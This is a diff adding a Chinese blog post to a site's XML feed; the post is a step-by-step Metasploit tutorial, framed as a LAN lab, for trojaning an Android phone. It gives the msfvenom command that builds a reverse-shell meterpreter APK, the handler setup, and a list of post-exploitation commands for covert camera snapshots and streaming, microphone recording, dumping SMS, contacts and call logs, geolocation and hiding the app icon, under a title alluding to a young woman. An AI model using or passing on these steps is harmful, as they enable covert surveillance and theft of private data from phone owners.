@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>美少妇与Android的故事</title>
+      <link href="/posts/32544.html"/>
+      <url>/posts/32544.html</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>学习环境： </p><pre><code>            渗透测试环境 ：局域网                             系统： Kali Liunx                             工具： MFS                              目标 ：安卓手机</code></pre></blockquote><ul><li>首先打开msf，输入命令<code>show payloads</code> 查看攻击载荷</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001439.png" alt=""></p><ul><li>配置木马并生成</li></ul><p><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.74.129 LPORT=4444 R &gt; /root/桌面/shell.apk</code></p><p>命令说明：</p><p><code>android/meterpreter/reverse_tcp</code>  攻击载荷</p><p><code>LHOST=192.168.74.129</code>  控制端的IP（也就是本机kali的ip） 查询IP的指令<code>ifconfig</code> </p><p><code>LPORT=4444</code> 监听端口</p><p><code>R &gt; /root/桌面/shell.apk</code>   保存路径为桌面</p><p>附图！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001437.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004816.png" alt=""></p><ul><li>启用攻击模块，并配置控制端信息。</li></ul><p><code>use exploit/multi/handler</code>  选择攻击模式</p><p><code>set payload android/meterpreter/reverse_tcp</code>  加载攻击模块</p><p><code>show options</code> 查看参数设置</p><p><code>set LHOST</code>  设置攻击机ip</p><p><code>set LPORT</code>  设置监听端口</p><p><code>exploit</code> 执行</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004817.png" alt=""></p><p>最后等待马子上线，反弹shell到控制端。</p><p>附图！！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004818.png" alt=""></p><p>控制终端输入<code>sysinfo</code> 查看手机系统相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001435.png" alt=""></p><p>控制终端输入 <code>webcam_list</code> 查看手机摄影头有几个 这里显示两项 分别表示有前后两个摄像头</p><p> <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001438.png" alt=""></p><p><code>webcam_snap</code> 隐秘拍照功能</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004821.png" alt=""></p><p><code>webcam_stream</code>开启摄像头</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004819.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004820.png" alt=""></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre><code>webcam_list  列出网络摄像头record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒webcam_chat  开始视频聊天webcam_snap  从指定的摄像头获取快照webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头activity_start  从URI字符串启动Android活动check_root  检查设备是否有根dump_calllog  获取调用日志dump_contacts  获取联系人列表dump_sms  获取短信geolocate  利用地理定位获取当前LATwlan_geolocate  利用WLAN信息获取当前LAThide_app_icon  从发射器隐藏应用程序图标interval_collect  管理区间收集能力send_sms  从目标会话发送短消息set_audio_modesqlite_query  从存储库查询SQLite数据库wakelock  启用/禁用Wakelock</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP总结笔记</title>
       <link href="/posts/51165.html"/>
       <url>/posts/51165.html</url>
